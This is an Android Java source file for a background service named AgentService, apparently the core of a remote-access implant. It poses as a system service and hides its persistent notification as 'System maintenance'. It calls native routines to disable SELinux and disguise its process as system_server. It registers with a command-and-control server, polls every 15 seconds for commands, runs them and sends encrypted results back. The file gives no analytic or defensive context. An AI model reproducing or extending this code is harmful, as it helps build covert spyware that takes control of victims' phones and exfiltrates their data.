package com.android.systemservice;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONObject;

public class AgentService extends Service {
    private static final String TAG = "SystemService";
    private static final String CHANNEL_ID = "sys_svc_channel";
    private static final int NOTIFICATION_ID = 1001;
    private static final long POLL_INTERVAL_MS = 15_000L;

    private Handler handler;
    private C2Client c2;
    private CommandHandler cmdHandler;
    private volatile boolean running;

    @Override
    public void onCreate() {
        super.onCreate();
        running = true;
        handler = new Handler(Looper.getMainLooper());
        c2 = new C2Client(this);
        cmdHandler = new CommandHandler(this);

        NativeBridge.disableSELinux();
        NativeBridge.maskProcessName("system_server");

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());

        Log.d(TAG, "AgentService created — polling started");
        startPollLoop();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }

    // ------------------------------------------------------------------ polling

    private void startPollLoop() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!running) return;
                pollOnce();
                handler.postDelayed(this, POLL_INTERVAL_MS);
            }
        }, 3_000L);
    }

    private void pollOnce() {
        new Thread(() -> {
            try {
                if (!c2.isRegistered()) {
                    c2.register();
                    Log.d(TAG, "Registered with C2");
                }
                JSONObject cmd = c2.fetchCommand();
                if (cmd == null) return;
                String command = cmd.optString("command", "idle");
                if ("idle".equals(command)) return;
                Log.d(TAG, "Command received: " + command);

                String resultJson = cmdHandler.handle(command);
                if (resultJson != null) {
                    String encrypted = NativeBridge.encryptData(resultJson);
                    c2.submitResult(command, encrypted);
                    Log.d(TAG, "Result submitted for: " + command);
                }
            } catch (Exception e) {
                Log.e(TAG, "Poll error", e);
            }
        }).start();
    }

    // ---------------------------------------------------------------- notification

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID,
                    "System Services",
                    NotificationManager.IMPORTANCE_MIN
            );
            ch.setDescription("System maintenance");
            ch.setShowBadge(false);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setSound(null, null);
            NotificationManager nm =
                    (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        builder.setSmallIcon(android.R.drawable.ic_dialog_map)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN);
        return builder.build();
    }
}
